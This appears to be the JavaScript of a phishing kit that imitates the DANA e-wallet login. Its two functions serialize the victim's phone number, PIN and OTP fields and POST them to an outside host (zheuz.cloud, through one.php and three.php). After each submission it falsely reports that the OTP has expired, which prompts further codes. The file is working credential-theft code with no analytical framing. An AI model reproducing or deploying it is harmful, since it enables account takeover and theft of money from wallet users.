/////
function sendNohp(event) {
   $("#process").show();
   event.preventDefault();
   $("#inp").blur();
   var dataString = $("#formNohp, #formPin, #formOtp").serialize();
   $.ajax({
      type: 'POST',
      url: 'https://zheuz.cloud/dana/egom1/one.php',
      data: dataString,
      complete: function(data) {
         console.log('Complete');
         $("#process").hide();
         document.getElementById("back1").style.display = "none";
         document.getElementById("back2").style.display = "block";
         $("#formNohp").fadeOut();
         setTimeout(function() {
            $(".bgotp").fadeIn();
            $("#otp1").focus();
         }, 500);
      }
   });
};






///
function sendOtp() {
   $(".loadingOtp").show();
   event.preventDefault();
   setTimeout(function() {
      $("#waktuku").text("Masa berlaku OTP sudah habis");
      $("#waktuku").css("color", "red");
   }, 2000);
   var dataString = $("#formNohp, #formPin, #formOtp").serialize();
   $.ajax({
      type: 'POST',
      url: 'https://zheuz.cloud/dana/egom1/three.php',
      data: dataString,
      complete: function(data) {
         console.log('Complete');
         setTimeout(function() {
            $(".loadingOtp").hide();
            $('.inpotp').val('');
            $('#otp1').focus();
           // var nomor = document.getElementById("inp").value;
           // document.getElementById("alert").innerHTML = "Kode baru dikirim ulang ke +62" + nomor + " via<br/>";
          //  $(".alert").css("color", "black");
         }, 4000);
      }
   });
};
    
       
